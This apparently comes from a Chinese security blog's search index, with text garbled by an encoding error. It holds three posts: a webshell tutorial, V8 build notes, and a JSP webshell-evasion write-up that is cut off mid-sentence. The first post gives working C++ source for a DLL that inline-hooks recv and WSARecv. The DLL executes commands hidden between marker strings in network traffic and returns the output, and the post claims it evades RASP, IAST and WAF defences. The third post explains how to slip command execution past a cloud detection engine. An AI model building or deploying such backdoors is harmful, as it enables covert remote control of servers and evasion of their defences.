<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>åˆ©ç”¨ Hook æŠ€æœ¯æ‰“é€ é€šç”¨çš„ Webshell</title>
      <link href="/2021/06/23/use-inlinehook-technology-to-make-a-more-general-webshell/"/>
      <url>/2021/06/23/use-inlinehook-technology-to-make-a-more-general-webshell/</url>
      
        <content type="html"><![CDATA[<blockquote><p>æ ‡é¢˜ä¸­çš„ â€œé€šç”¨â€ æŒ‡è·¨è¯­è¨€ï¼Œæœ¬æ–‡çš„å®ç°æ˜¯åŸºäº Windows çš„ï¼Œéœ€è¦ Linux çš„å¯ä»¥å‚è€ƒæœ¬æ–‡çš„æ€è·¯ï¼Œå®ç°èµ·æ¥å¹¶æ²¡æœ‰å¤ªå¤§åŒºåˆ«ã€‚</p></blockquote><h1 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h1><p>Windows ä¸Šç¨‹åºæ¶‰åŠç½‘ç»œ socket æ“ä½œï¼Œä¸€èˆ¬éƒ½ä¼šç”¨åˆ° winsock2 çš„åº“ï¼Œç¨‹åºä¼šåŠ¨æ€é“¾æ¥ <code>ws2_32.dll</code> ï¼ŒJVMï¼ŒPythonï¼ŒZend ç­‰è§£é‡Šå™¨éƒ½ä¸ä¾‹å¤–ã€‚</p><p>winsock2 é‡Œ socket æ“ä½œç›¸å…³çš„å‡½æ•° <code>recv</code> <code>send</code> <code>closesocket</code> ä¼šç¼–ç¨‹çš„åº”è¯¥éƒ½ä¸é™Œç”Ÿã€‚<strong>hook æ‰ <code>recv</code> å‡½æ•°å°±å¯ä»¥åœ¨ç¨‹åºå¤„ç†æ¥å—åˆ°ç½‘ç»œæ•°æ®å‰ï¼Œè¿›å…¥æˆ‘ä»¬çš„å¤„ç†é€»è¾‘æ—©ä¸€æ­¥æ”¶åˆ°æ•°æ®ã€‚</strong></p><p>ç”±äºå®ç°æ˜¯ native çš„ï¼Œæ‰€ä»¥åœ¨æˆåŠŸ hook çš„æƒ…å†µä¸‹èƒ½ç»•è¿‡ç°ä»£çš„ RASPã€IASTã€äº‘WAF ç­‰ç°ä»£æµè¡Œçš„é˜²æŠ¤æŠ€æœ¯ã€‚</p><h1 id="Inline-Hook"><a href="#Inline-Hook" class="headerlink" title="Inline Hook"></a>Inline Hook</h1><p>Inline Hook æ˜¯åœ¨ç¨‹åºè¿è¡Œæ—¶ç›´æ¥ä¿®æ”¹æŒ‡ä»¤ï¼Œæ’å…¥è·³è½¬æŒ‡ä»¤ï¼ˆjmp/call/retnï¼‰æ¥æ§åˆ¶ç¨‹åºæ‰§è¡Œæµçš„ä¸€ç§æŠ€æœ¯ã€‚ç›¸æ¯”åˆ«çš„ Hook æŠ€æœ¯ï¼ŒInline Hook ä¼˜ç‚¹æ˜¯èƒ½è·¨å¹³å°ï¼Œç¨³å®šï¼Œæœ¬æ–‡æ˜¯ä»¥æ­¤æŠ€æœ¯å®ç°çš„ã€‚</p><h1 id="å®ç°"><a href="#å®ç°" class="headerlink" title="å®ç°"></a>å®ç°</h1><p>å…·ä½“å®ç°åˆ†ä¸ºä¸¤ä¸ªéƒ¨åˆ†ï¼Œä¸€ä¸ªæ˜¯hookå‡½æ•°çš„ DLL(åªè®²è¿™ä¸ª)ï¼›å¦ä¸€ä¸ªæ˜¯å‘è¿›ç¨‹æ³¨å…¥ DLL çš„è¾…åŠ©å·¥å…·(ç½‘ä¸Šçš„æ–‡ç« å¾ˆå¤šï¼Œéœ€è¦çš„è§å®Œæ•´æºç )ã€‚</p><h2 id="InstallHook"><a href="#InstallHook" class="headerlink" title="InstallHook"></a>InstallHook</h2><p>å®‰è£…é’©å­</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> START_BLOCK <span class="meta-string">"#CMD0#"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> END_BLOCK <span class="meta-string">"#CMD1#"</span></span></span><br><span class="line"></span><br><span class="line">DWORD dwInstSize = <span class="number">12</span>;</span><br><span class="line">BYTE RecvEntryPointInst[<span class="number">12</span>] = &#123; <span class="number">0x00</span> &#125;;</span><br><span class="line">BYTE RecvEntryPointInstHook[<span class="number">12</span>] = &#123; <span class="number">0x48</span>, <span class="number">0xB8</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span> &#125;;</span><br><span class="line">BYTE WSARecvEntryPointInst[<span class="number">12</span>] = &#123; <span class="number">0x00</span> &#125;;</span><br><span class="line">BYTE WSARecvEntryPointInstHook[<span class="number">12</span>] = &#123; <span class="number">0x48</span>, <span class="number">0xB8</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">( *PFNRecv )</span><span class="params">( SOCKET, <span class="keyword">char</span>*, <span class="keyword">int</span>, <span class="keyword">int</span> )</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">( *PFNSend )</span><span class="params">( SOCKET, <span class="keyword">char</span>*, <span class="keyword">int</span>, <span class="keyword">int</span> )</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">( *PFNWSARecv )</span> <span class="params">( SOCKET, LPWSABUF, DWORD, LPDWORD, LPDWORD, LPWSAOVERLAPPED, LPWSAOVERLAPPED_COMPLETION_ROUTINE )</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">( *PFNWSASend )</span> <span class="params">( SOCKET, LPWSABUF, DWORD, LPDWORD, LPDWORD, LPWSAOVERLAPPED, LPWSAOVERLAPPED_COMPLETION_ROUTINE )</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InstallHook</span><span class="params">(LPCWSTR lpModule, LPCSTR lpFuncName, LPVOID lpFunction)</span> </span>&#123;</span><br><span class="line">DWORD_PTR FuncAddress = (UINT64) GetProcAddress(GetModuleHandleW(lpModule), lpFuncName);</span><br><span class="line">DWORD OldProtect = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(VirtualProtect((LPVOID) FuncAddress, dwInstSize, PAGE_EXECUTE_READWRITE, &amp;OldProtect))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="built_in">strcmp</span>(lpFuncName, <span class="string">"recv"</span>)) &#123;</span><br><span class="line"><span class="built_in">memcpy</span>(RecvEntryPointInst, (LPVOID) FuncAddress, dwInstSize);</span><br><span class="line">*(PINT64) ( RecvEntryPointInstHook + <span class="number">2</span> ) = (UINT64) lpFunction;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="built_in">strcmp</span>(lpFuncName, <span class="string">"WSARecv"</span>)) &#123;</span><br><span class="line"><span class="built_in">memcpy</span>(WSARecvEntryPointInst, (LPVOID) FuncAddress, dwInstSize);</span><br><span class="line">*(PINT64) ( WSARecvEntryPointInstHook + <span class="number">2</span> ) = (UINT64) lpFunction;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="built_in">strcmp</span>(lpFuncName, <span class="string">"recv"</span>)) </span><br><span class="line"><span class="built_in">memcpy</span>((LPVOID) FuncAddress, &amp;RecvEntryPointInstHook, <span class="keyword">sizeof</span>(RecvEntryPointInstHook));</span><br><span class="line"><span class="keyword">if</span>(!<span class="built_in">strcmp</span>(lpFuncName,<span class="string">"WSARecv"</span>))</span><br><span class="line"><span class="built_in">memcpy</span>((LPVOID) FuncAddress, &amp;WSARecvEntryPointInstHook, <span class="keyword">sizeof</span>(WSARecvEntryPointInstHook));</span><br><span class="line"></span><br><span class="line">VirtualProtect((LPVOID) FuncAddress, dwInstSize, OldProtect, &amp;OldProtect);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="UninstallHook"><a href="#UninstallHook" class="headerlink" title="UninstallHook"></a>UninstallHook</h2><p>å¸è½½é’©å­</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">UninstallHook</span><span class="params">(LPCWSTR lpModule, LPCSTR lpFuncName)</span> </span>&#123;</span><br><span class="line">UINT64 FuncAddress = (UINT64) GetProcAddress(GetModuleHandleW(lpModule), lpFuncName);</span><br><span class="line">DWORD OldProtect = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(VirtualProtect((LPVOID) FuncAddress, dwInstSize, PAGE_EXECUTE_READWRITE, &amp;OldProtect))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="built_in">strcmp</span>(lpFuncName, <span class="string">"recv"</span>)) </span><br><span class="line"><span class="built_in">memcpy</span>((LPVOID) FuncAddress, RecvEntryPointInst, <span class="keyword">sizeof</span>(RecvEntryPointInst));</span><br><span class="line"><span class="keyword">if</span>(!<span class="built_in">strcmp</span>(lpFuncName,<span class="string">"WSARecv"</span>))</span><br><span class="line"><span class="built_in">memcpy</span>((LPVOID) FuncAddress, WSARecvEntryPointInst, <span class="keyword">sizeof</span>(WSARecvEntryPointInst));</span><br><span class="line">&#125;</span><br><span class="line">VirtualProtect((LPVOID) FuncAddress, dwInstSize, OldProtect, &amp;OldProtect);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="HookRecv"><a href="#HookRecv" class="headerlink" title="HookRecv"></a>HookRecv</h2><p>hook recv çš„å‡½æ•°ï¼Œç¨‹åºåœ¨æ‰§è¡Œ recv æ—¶ï¼Œä¼šå…ˆè¿›å…¥è¿™ä¸ªå‡½æ•°ã€‚</p><p>åœ¨è¿™ä¸ªå‡½æ•°é‡Œï¼Œè°ƒç”¨åŸæ¥çš„ recv è·å–æ•°æ®ï¼Œåˆ¤æ–­æ˜¯å¦æœ‰<code>START_BLOCK</code>ã€<code>END_BLOCK</code>å—ï¼Œæœ‰çš„è¯å°±å–å‡ºå—ä¹‹é—´çš„å‘½ä»¤ï¼Œæ‰§è¡Œã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> WINAPI <span class="title">HookRecv</span><span class="params">(SOCKET s, <span class="keyword">char</span>* buf, <span class="keyword">int</span> len, <span class="keyword">int</span> flags)</span> </span>&#123;</span><br><span class="line">UninstallHook(<span class="string">L"ws2_32.dll"</span>, <span class="string">"recv"</span>);</span><br><span class="line"></span><br><span class="line">PFNRecv pfnRecv = (PFNRecv) GetProcAddress(GetModuleHandleW(<span class="string">L"ws2_32.dll"</span>), <span class="string">"recv"</span>);</span><br><span class="line">PFNSend pfnSend = (PFNSend) GetProcAddress(GetModuleHandleW(<span class="string">L"ws2_32.dll"</span>), <span class="string">"send"</span>);</span><br><span class="line">PFNClosesocket pfnClosesocket = (PFNClosesocket) GetProcAddress(GetModuleHandleW(<span class="string">L"ws2_32.dll"</span>), <span class="string">"closesocket"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> rc = pfnRecv(s, buf, len, flags);</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span>* startBlock = <span class="built_in">strstr</span>(buf, START_BLOCK);</span><br><span class="line"><span class="keyword">if</span>(startBlock) &#123;</span><br><span class="line"><span class="keyword">char</span>* endBlock = <span class="built_in">strstr</span>(startBlock, END_BLOCK);</span><br><span class="line"><span class="keyword">if</span>(endBlock) &#123;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> start_block = <span class="built_in">std</span>::<span class="built_in">string</span>(startBlock);</span><br><span class="line"><span class="keyword">int</span> endOffset = start_block.find(END_BLOCK, <span class="keyword">sizeof</span>(START_BLOCK));</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> cmd = start_block.substr(<span class="keyword">sizeof</span>(START_BLOCK) - <span class="number">1</span>, start_block.size() - <span class="keyword">sizeof</span>(START_BLOCK) - ( start_block.size() - endOffset ) + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> output = WSTR2STR(ExecuteCmd(cmd));</span><br><span class="line"></span><br><span class="line">pfnSend(s, (<span class="keyword">char</span>*) output.c_str(), output.size(), <span class="number">0</span>);</span><br><span class="line">         pfnClosesocket(s);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">InstallHook(<span class="string">L"ws2_32.dll"</span>, <span class="string">"recv"</span>, (LPVOID) HookRecv);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>  rc;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> WINAPI <span class="title">HookWSARecv</span><span class="params">(SOCKET s, LPWSABUF lpBuffer, DWORD dwBufferCount, LPDWORD lpNumberOfBytesRecvd, LPDWORD lpFlags, LPWSAOVERLAPPED lpOverlapped, LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">UninstallHook(<span class="string">L"ws2_32.dll"</span>, <span class="string">"WSARecv"</span>);</span><br><span class="line"></span><br><span class="line">PFNWSARecv pfnWSARecv = (PFNWSARecv) GetProcAddress(GetModuleHandleW(<span class="string">L"ws2_32.dll"</span>), <span class="string">"WSARecv"</span>);</span><br><span class="line">PFNWSASend pfnWSASend = (PFNWSASend) GetProcAddress(GetModuleHandleW(<span class="string">L"ws2_32.dll"</span>), <span class="string">"WSASend"</span>);</span><br><span class="line">PFNClosesocket pfnClosesocket = (PFNClosesocket) GetProcAddress(GetModuleHandleW(<span class="string">L"ws2_32.dll"</span>), <span class="string">"closesocket"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> rc = pfnWSARecv(s, lpBuffer, dwBufferCount, lpNumberOfBytesRecvd, lpFlags, lpOverlapped, lpCompletionRoutine);</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span>* startBlock = <span class="built_in">strstr</span>(lpBuffer-&gt;buf, START_BLOCK);</span><br><span class="line"><span class="keyword">if</span>(startBlock) &#123;</span><br><span class="line"><span class="keyword">char</span>* endBlock = <span class="built_in">strstr</span>(startBlock, END_BLOCK);</span><br><span class="line"><span class="keyword">if</span>(endBlock) &#123;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> start_block = <span class="built_in">std</span>::<span class="built_in">string</span>(startBlock);</span><br><span class="line"><span class="keyword">int</span> endOffset = start_block.find(END_BLOCK, <span class="keyword">sizeof</span>(START_BLOCK));</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> cmd = start_block.substr(<span class="keyword">sizeof</span>(START_BLOCK) - <span class="number">1</span>, start_block.size() - <span class="keyword">sizeof</span>(START_BLOCK) - ( start_block.size() - endOffset ) + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">WSABUF outBuf;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> output = WSTR2STR(ExecuteCmd(cmd));</span><br><span class="line">outBuf.buf = (<span class="keyword">char</span>*) output.c_str();</span><br><span class="line">outBuf.len = output.size();</span><br><span class="line"></span><br><span class="line">pfnWSASend(s, &amp;outBuf, <span class="number">1</span>, lpNumberOfBytesRecvd, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">         pfnClosesocket(s);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">InstallHook(<span class="string">L"ws2_32.dll"</span>, <span class="string">"WSARecv"</span>, (LPVOID) HookWSARecv);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>  rc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>è¿™é‡Œè¿˜ hook äº† <code>WSARecv</code> ï¼Œæ˜¯å› ä¸ºæˆ‘åœ¨ Tomcat ä¸Šæµ‹è¯•é‡åˆ°ä¸ªé—®é¢˜  hook <code>recv</code> åæ”¶åˆ°çš„æ•°æ®æ˜¯ä¹±ç ï¼Œé•¿åº¦ä¹Ÿå¯¹ä¸ä¸Šã€‚ åæ¥æƒ³åˆ° Tomcat ç°åœ¨é»˜è®¤æ˜¯ NIO å¤„ç†ï¼ŒJVM çš„ç”¨çš„ API å¯èƒ½ä¸ä¸€æ ·ï¼Œç¿»çœ‹äº†ä¸€ä¸‹æºç ï¼Œå‘ç° Windows ä¸Š NIO ç›¸å…³çš„ socket æ“ä½œå‡½æ•°å®é™…ç”¨çš„æ˜¯ <code>WSARecv</code>ã€<code>WSASend</code> ç­‰å¸¦ <code>WSA</code> å‰ç¼€çš„ï¼ŒåŠ äº† hook ç‚¹ä¹‹åèƒ½æ­£å¸¸è¯»åˆ°æ•°æ®äº†ã€‚</p></blockquote><h2 id="DllMain"><a href="#DllMain" class="headerlink" title="DllMain"></a>DllMain</h2><p>DLL å…¥å£ï¼Œè°ƒç”¨å®‰è£…é’©å­</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL WINAPI <span class="title">DllMain</span><span class="params">(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)</span> </span>&#123;</span><br><span class="line"><span class="keyword">switch</span>(fdwReason)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">InstallHook(<span class="string">L"ws2_32.dll"</span>, <span class="string">"recv"</span>, (LPVOID) HookRecv);</span><br><span class="line">InstallHook(<span class="string">L"ws2_32.dll"</span>, <span class="string">"WSARecv"</span>, (LPVOID) HookWSARecv);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="æ•ˆæœ"><a href="#æ•ˆæœ" class="headerlink" title="æ•ˆæœ"></a>æ•ˆæœ</h1><h2 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h2><p><img src="/2021/06/23/use-inlinehook-technology-to-make-a-more-general-webshell/java.gif" alt="java"></p><h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><p><img src="/2021/06/23/use-inlinehook-technology-to-make-a-more-general-webshell/python.gif" alt="python"></p>]]></content>
      
      
      
        <tags>
            
            <tag> å¼€å‘ </tag>
            
            <tag> Java </tag>
            
            <tag> RedTeam </tag>
            
            <tag> çº¢è“å¯¹æŠ— </tag>
            
            <tag> å·¥å…·åˆ†äº« </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>åœ¨ Win10 ä¸Šç¼–è¯‘ V8 å¼•æ“</title>
      <link href="/2021/06/23/compile-v8-on-windows10/"/>
      <url>/2021/06/23/compile-v8-on-windows10/</url>
      
        <content type="html"><![CDATA[<p>è®°å½•ä¸€ä¸‹ç¼–è¯‘ V8 è¸©å‘çš„è¿‡ç¨‹ï¼ˆä»¥ä¸‹å…¨ç¨‹éœ€è¦ç§‘å­¦ä¸Šç½‘ï¼Œæˆ‘æ˜¯é…äº† Proxifierï¼‰</p><h1 id="è¿‡ç¨‹"><a href="#è¿‡ç¨‹" class="headerlink" title="è¿‡ç¨‹"></a>è¿‡ç¨‹</h1><ol start="0"><li><p>å…ˆå®‰è£… VisualStudio 2019ï¼Œç•¥è¯¦ç»†è¿‡ç¨‹</p></li><li><p>clone å¼€å‘ç¯å¢ƒ</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /d d:\</span><br><span class="line"></span><br><span class="line">git clone https://chromium.googlesource.com/chromium/tools/depot_tools</span><br></pre></td></tr></table></figure></li><li><p>è®¾ç½®ç¯å¢ƒå˜é‡</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set DEPOT_TOOLS_WIN_TOOLCHAIN = 0</span><br><span class="line">set GYP_MSVS_VERSION = 2019    # æˆ–è€… 2017</span><br></pre></td></tr></table></figure></li><li><p>clone v8 ä»“åº“ï¼Œå®Œæ•´çš„å¤§æ¦‚ 700M</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fetch v8</span><br></pre></td></tr></table></figure></li><li><p>åŒæ­¥ç¬¬ä¸‰æ–¹ç»„ä»¶ï¼Œä¼šèŠ±ä¸€ç‚¹æ—¶é—´</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gclient sync</span><br></pre></td></tr></table></figure></li><li><p>ç”Ÿæˆç¼–è¯‘é…ç½®</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python tools/dev/v8gen.py ia32.debug</span><br></pre></td></tr></table></figure></li><li><p>ç¼–è¯‘ï¼Œå¤§æ¦‚ 10 åˆ†é’Ÿ</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ninja -C .\out.gn\ia32.debug d8 -j12</span><br></pre></td></tr></table></figure></li><li><p>å®Œæˆ</p></li></ol><h1 id="é—®é¢˜"><a href="#é—®é¢˜" class="headerlink" title="é—®é¢˜"></a>é—®é¢˜</h1><h2 id="æç¤ºç¼ºå°‘-LASTCHANGE"><a href="#æç¤ºç¼ºå°‘-LASTCHANGE" class="headerlink" title="æç¤ºç¼ºå°‘ LASTCHANGE"></a>æç¤ºç¼ºå°‘ LASTCHANGE</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python .\build\util\lastchange.py .\build\util\LASTCHANGE</span><br></pre></td></tr></table></figure><h2 id="æ‰¾ä¸åˆ°-clang-cl-exe"><a href="#æ‰¾ä¸åˆ°-clang-cl-exe" class="headerlink" title="æ‰¾ä¸åˆ° clang-cl.exe"></a>æ‰¾ä¸åˆ° clang-cl.exe</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python .\tools\clang\scripts\update.py</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>JSPå…æ€ â€”â€” ç»•è¿‡æ™ºèƒ½AIï¼Ÿ</title>
      <link href="/2021/02/05/antiav-jsp-webshell/"/>
      <url>/2021/02/05/antiav-jsp-webshell/</url>
      
        <content type="html"><![CDATA[<p>ç©æŸäº‘çš„â€œå·å®Œè®¡åˆ’â€æƒ³åˆ°çš„å§¿åŠ¿ï¼Œåˆ†äº«ä¸€ä¸‹ã€‚</p><p>æŸäº‘çš„éª‘å£«å·ç§°æ˜¯é‡‡ç”¨å…ˆè¿›çš„åŠ¨æ€ç›‘æµ‹æŠ€æœ¯ï¼Œç»“åˆä¸»æœºæ™ºèƒ½å†…æ ¸AIæ£€æµ‹æŠ€æœ¯ç­‰å¤šç§å¼•æ“é›¶è§„åˆ™æŸ¥æ€ï¼Œåšåˆ°ä½è¯¯æŠ¥ï¼Œé«˜æŸ¥æ€ç‡ã€‚</p><p>æµ‹ä¸‹æ¥æŸ¥æ€ç‡ç¡®å®é«˜ï¼Œåªè¦å‡ºç° <code>Runtime.getRuntime().exec(&quot;calc&quot;)</code> ç­‰å‘½ä»¤æ‰§è¡Œç›´æ¥ç›¸å…³çš„æ–¹æ³•è°ƒç”¨å°±æ€ï¼Œä¸è¿‡ä¸€ä¸ªæ ·æœ¬æµ‹ä¸‹æ¥è¦ä¸€åˆ†é’Ÿï¼Œé€Ÿåº¦ç›¸å½“æ…¢ï¼Œå®é™…è½åœ°è¿˜è¦å¾ˆé•¿çš„è·¯è¦èµ°ã€‚/ç‹—å¤´</p><h1 id="ç»•è¿‡"><a href="#ç»•è¿‡" class="headerlink" title="ç»•è¿‡"></a>ç»•è¿‡</h1><p>å¼€å§‹è®²ç»•è¿‡ã€‚</p><p>é¦–å…ˆæ˜¯å‘½ä»¤æ‰§è¡Œçš„sinkï¼Œç›´æ¥å†™ <code>Runtime.getRuntime().exec()</code> å³ä½¿jspç¼–è¯‘ä¸é€šè¿‡ä¹Ÿæ˜¯ä¼šè¢«checkåˆ°çš„ï¼Œè¯´æ˜å¼•æ“æœ‰ä¸€äº›å¼ºæ£€æµ‹é€»è¾‘ï¼Œç±»ä¼¼æ­£åˆ™ï¼ŒåŒ¹é…å³æ€ã€‚è€Œå¦‚æœè¿‚å›ä¸€ä¸‹ï¼Œæˆ‘ä»¬æ‰¾ä¸€ä¸ªè·³æ¿ï¼Œæ¯”å¦‚ <code>new ProcessBuilder()</code> ï¼Œæˆ–è€…åå°„æ„é€  <code>ProcessImpl</code> å®ä¾‹ï¼Œè¿˜ä¸ä¼šè¢«æ€ï¼Œ(ç”¨æ³•å‚è€ƒ<a href="https://xz.aliyun.com/t/7798" target="_blank" rel="noopener">ä¸‰æ¢¦çš„æ–‡ç« </a>)ã€‚</p><p>æ„é€ å¥½è·³æ¿ï¼Œå½“è°ƒç”¨ <code>start()</code> å®é™…æ‰§è¡Œçš„æ—¶å€™ï¼Œå¦‚æœå‘½ä»¤æ˜¯ç¡¬ç¼–ç çš„æ²¡æœ‰æ€ï¼Œå¦‚æœæ˜¯ä» request.getParameter(â€œxxxâ€) å–çš„è¿˜æ˜¯ä¼šæ€çš„ã€‚</p><p>è¯´æ˜å¼•æ“åº”è¯¥ç”¨åˆ°äº†ç±»ä¼¼æ±¡ç‚¹åˆ†æçš„åŸç†ï¼Œæ›´æ¢å‘½ä»¤æ‰§è¡Œçš„ sink æ˜¯å¯ä»¥ç»•è¿‡çš„ï¼Œä½†è¦å®Œå…¨ç»•è¿‡è¿˜è¦æ‰¾åˆ«çš„ sourceï¼Œè¯•äº†ä¸€åœˆ request 